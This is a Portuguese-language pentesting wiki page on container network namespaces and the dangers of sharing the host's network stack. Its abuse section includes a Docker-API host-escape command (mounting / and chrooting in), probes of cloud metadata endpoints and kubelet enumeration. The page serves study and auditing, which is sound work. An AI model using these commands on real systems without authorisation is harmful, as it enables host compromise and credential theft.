# Namespace de Rede

{{#include ../../../../../banners/hacktricks-training.md}}

## Visão Geral

O namespace de rede isola recursos relacionados à rede, como interfaces, endereços IP, tabelas de roteamento, estado ARP/neighbor, regras de firewall, sockets e o conteúdo de arquivos como `/proc/net`. É por isso que um container pode ter algo que parece seu próprio `eth0`, suas próprias rotas locais e seu próprio dispositivo loopback sem possuir a pilha de rede real do host.

Do ponto de vista de segurança, isso importa porque o isolamento de rede envolve muito mais do que vinculação de portas. Um namespace de rede privado limita o que a workload pode observar ou reconfigurar diretamente. Uma vez que esse namespace é compartilhado com o host, o container pode de repente ganhar visibilidade sobre host listeners, serviços locais do host e pontos de controle de rede que nunca deveriam ser expostos à aplicação.

## Operação

Um namespace de rede recém-criado começa com um ambiente de rede vazio ou quase vazio até que interfaces sejam anexadas a ele. Container runtimes então criam ou conectam interfaces virtuais, atribuem endereços e configuram rotas para que a workload tenha a conectividade esperada. Em implementações baseadas em bridge, isso geralmente significa que o container vê uma interface veth-backed conectada a uma bridge do host. No Kubernetes, plugins CNI cuidam da configuração equivalente para a rede de Pods.

Essa arquitetura explica por que `--network=host` ou `hostNetwork: true` é uma mudança tão drástica. Em vez de receber uma pilha de rede privada preparada, a workload junta-se à pilha real do host.

## Laboratório

Você pode ver um namespace de rede quase vazio com:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
E você pode comparar containers normais e containers host-networked com:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
O container com rede do host não tem mais sua própria visão isolada de sockets e interfaces. Essa mudança por si só já é significativa antes mesmo de considerar quais capacidades o processo possui.

## Uso em tempo de execução

Docker e Podman normalmente criam um namespace de rede privado para cada container, a menos que configurados de outra forma. Kubernetes geralmente dá a cada Pod seu próprio namespace de rede, compartilhado pelos containers dentro desse Pod, mas separado do host. Incus/LXC também fornecem isolamento rico baseado em namespace de rede, frequentemente com uma variedade maior de configurações de rede virtual.

O princípio comum é que a rede privada é a fronteira de isolamento padrão, enquanto a rede do host é uma exceção explícita a essa fronteira.

## Misconfigurações

A misconfiguração mais importante é simplesmente compartilhar o namespace de rede do host. Isso às vezes é feito por desempenho, monitoramento de baixo nível ou conveniência, mas remove uma das fronteiras mais limpas disponíveis para os containers. Listeners locais do host tornam-se alcançáveis de forma mais direta, serviços restritos a localhost podem se tornar acessíveis, e capacidades como `CAP_NET_ADMIN` ou `CAP_NET_RAW` tornam-se muito mais perigosas porque as operações que possibilitam agora são aplicadas ao próprio ambiente de rede do host.

Outro problema é conceder em excesso capacidades relacionadas à rede mesmo quando o namespace de rede é privado. Um namespace privado ajuda, mas não torna raw sockets ou controle avançado de rede inofensivos.

## Abuso

Em ambientes com isolamento fraco, atacantes podem inspecionar serviços que escutam no host, alcançar endpoints de gerenciamento vinculados apenas ao loopback, sniff ou interferir com o tráfego dependendo das capacidades exatas e do ambiente, ou reconfigurar roteamento e o estado do firewall se `CAP_NET_ADMIN` estiver presente. Em um cluster, isso também pode facilitar movimento lateral e reconhecimento do plano de controle.

Se suspeitar de rede do host, comece confirmando que as interfaces e listeners visíveis pertencem ao host em vez de a uma rede isolada do container:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Serviços disponíveis apenas no loopback costumam ser a primeira descoberta interessante:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Se capacidades de rede estiverem presentes, teste se a workload pode inspecionar ou alterar a stack visível:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Em ambientes de cluster ou nuvem, a rede do host também justifica um rápido recon local de metadados e serviços adjacentes ao plano de controle:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Exemplo completo: Rede do host + Runtime local / Acesso ao Kubelet

A rede do host não fornece automaticamente host root, mas frequentemente expõe serviços que são intencionalmente acessíveis apenas a partir do próprio nó. Se um desses serviços estiver pouco protegido, a rede do host torna-se um caminho direto de privilege-escalation.

Docker API em localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet no localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impacto:

- comprometimento direto do host se uma API de runtime local estiver exposta sem proteção adequada
- reconhecimento do cluster ou movimento lateral se kubelet ou agentes locais estiverem acessíveis
- manipulação de tráfego ou negação de serviço quando combinado com `CAP_NET_ADMIN`

## Verificações

O objetivo destas verificações é determinar se o processo possui uma pilha de rede privada, quais rotas e listeners são visíveis, e se a visão de rede já se assemelha à do host antes mesmo de você testar as capabilities.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
- Se o identificador do namespace ou o conjunto de interfaces visíveis parecer com o host, host networking pode já estar em uso.
- `ss -lntup` é especialmente valioso porque revela loopback-only listeners e endpoints de gerenciamento local.
- Rotas, nomes de interface e o contexto de firewall tornam-se muito mais importantes se `CAP_NET_ADMIN` ou `CAP_NET_RAW` estiver presente.

Ao revisar um container, avalie sempre o network namespace juntamente com o capability set. Host networking combinado com capacidades de rede amplas representa uma postura muito diferente de bridge networking combinado com um conjunto de capabilities padrão mais restrito.
{{#include ../../../../../banners/hacktricks-training.md}}
